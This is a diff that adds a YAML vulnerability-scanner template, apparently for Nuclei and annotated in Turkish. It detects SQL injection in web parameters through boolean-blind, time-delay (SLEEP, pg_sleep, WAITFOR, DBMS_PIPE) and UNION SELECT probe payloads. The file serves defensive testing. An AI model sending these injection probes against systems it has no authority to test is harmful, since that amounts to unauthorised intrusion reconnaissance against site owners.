@@ -1,0 +1,170 @@
+id: sqli-advanced
+
+info:
+  name: SQL Injection - Blind (Boolean/Time) & UNION (Kapsamlı SQLi Tespiti)
+  author: ertansa
+  severity: high
+  description: |
+    Hata-tabanlı tespitin ötesine geçen kapsamlı SQL enjeksiyonu tespiti; üç yöntem:
+      1) BOOLEAN-tabanlı kör (blind): `AND 1=1` (doğru) yanıtı temel (baseline) ile
+         AYNI, `AND 1=2` (yanlış) yanıtı FARKLI olduğunda ateşler (sayısal + string/tırnak
+         bağlamı). İçerik uzunluğu karşılaştırmasıyla doğrulanır → düşük FP.
+      2) TIME-tabanlı kör: temel istek hızlıyken enjekte edilen SLEEP/pg_sleep/WAITFOR/
+         DBMS_PIPE yükü yanıtı ≥5 sn geciktirirse ateşler (MySQL, PostgreSQL, MSSQL,
+         Oracle). Gecikme yalnızca zafiyet varsa oluştuğundan temiz hedefler yavaşlamaz.
+      3) UNION-tabanlı: `UNION SELECT 9999*9999` (=99980001) enjekte eder; hesaplanmış
+         sonuç gövdede görünür ama ham ifade görünmezse (salt yansıma değil) ateşler.
+         1–6 sütun dolgusu + sayısal/tırnak bağlamı denenir.
+    İstekler req-condition ile ilişkilendirilir. İngilizce + Türkçe parametreler.
+    -dast gerektirmez. Hata-tabanlı tespit için ayrıca `errsqli.yaml` kullanılır.
+    OWASP Top 10: A03:2021 - Injection.
+  reference:
+    - https://owasp.org/www-community/attacks/SQL_Injection
+    - https://portswigger.net/web-security/sql-injection/blind
+    - https://book.hacktricks.xyz/pentesting-web/sql-injection
+  classification:
+    cwe-id: CWE-89
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  metadata:
+    max-request: 121
+  tags: sqli,injection,blind,boolean-based,time-based,union,owasp,owasp-a03
+
+http:
+  # ============ 1) BOOLEAN-TABANLI KÖR ============
+  - raw:
+      # Sayısal bağlam: baseline / doğru / yanlış
+      - |
+        GET /?id=1 HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+      - |
+        GET /?id=1%20AND%201=1 HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+      - |
+        GET /?id=1%20AND%201=2 HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+      # String/tırnak bağlam: baseline / doğru / yanlış
+      - |
+        GET /?search=test HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+      - |
+        GET /?search=test%27%20AND%20%271%27=%271 HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+      - |
+        GET /?search=test%27%20AND%20%271%27=%272 HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    req-condition: true
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        name: boolean-blind-numeric
+        dsl:
+          - "status_code_1 == 200"
+          - "content_length_1 == content_length_2"
+          - "content_length_1 != content_length_3"
+        condition: and
+      - type: dsl
+        name: boolean-blind-string
+        dsl:
+          - "status_code_4 == 200"
+          - "content_length_4 == content_length_5"
+          - "content_length_4 != content_length_6"
+        condition: and
+
+    extractors:
+      - type: dsl
+        dsl:
+          - "'Boolean-tabanli kor SQLi: dogru kosul (1=1) baseline ile ayni, yanlis kosul (1=2) farkli yanit'"
+
+  # ============ 2) TIME-TABANLI KÖR ============
+  - raw:
+      - |
+        GET /?id=1 HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+      - |
+        GET /?id=1%20AND%20SLEEP(6) HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+      - |
+        GET /?id=1%3BSELECT%20pg_sleep(6)-- HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+      - |
+        GET /?id=1%3BWAITFOR%20DELAY%20%270:0:6%27-- HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+      - |
+        GET /?id=1%20AND%201=DBMS_PIPE.RECEIVE_MESSAGE(%27a%27,6) HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    req-condition: true
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        name: time-based-blind
+        dsl:
+          - "duration_1 < 4"
+          - "duration_2 - duration_1 >= 5 || duration_3 - duration_1 >= 5 || duration_4 - duration_1 >= 5 || duration_5 - duration_1 >= 5"
+        condition: and
+
+    extractors:
+      - type: dsl
+        dsl:
+          - "'Time-tabanli kor SQLi: enjekte SLEEP/pg_sleep/WAITFOR/DBMS_PIPE yaniti >=5 sn geciktirdi'"
+
+  # ============ 3) UNION-TABANLI ============
+  - method: GET
+    attack: clusterbomb
+    payloads:
+      param:
+        - "id"
+        - "cat"
+        - "category"
+        - "product_id"
+        - "q"
+        - "search"
+        - "page"
+        # Türkçe parametreler
+        - "urun"
+        - "kategori"
+        - "haber"
+        - "sayfa"
+      inj:
+        # Sayısal bağlam (-1 ile orijinal sonucu boşa çıkar) + 1–6 sütun dolgusu
+        - "-1 UNION SELECT 9999*9999-- -"
+        - "-1 UNION SELECT 9999*9999,NULL-- -"
+        - "-1 UNION SELECT 9999*9999,NULL,NULL-- -"
+        - "-1 UNION SELECT 9999*9999,NULL,NULL,NULL-- -"
+        - "-1 UNION SELECT 9999*9999,NULL,NULL,NULL,NULL-- -"
+        - "-1 UNION SELECT 9999*9999,NULL,NULL,NULL,NULL,NULL-- -"
+        # String/tırnak bağlam
+        - "' UNION SELECT 9999*9999-- -"
+        - "' UNION SELECT 9999*9999,NULL-- -"
+        - "' UNION SELECT 9999*9999,NULL,NULL-- -"
+        - "') UNION SELECT 9999*9999-- -"
+    path:
+      - "{{BaseURL}}?{{param}}={{inj}}"
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        name: union-based
+        dsl:
+          - "contains(body, '99980001')"
+          - "!contains(body, '9999*9999')"
+        condition: and
+
+    extractors:
+      - type: dsl
+        dsl:
+          - "'UNION-tabanli SQLi: 9999*9999=99980001 govdede hesaplanmis (parametre: ' + param + ')'"
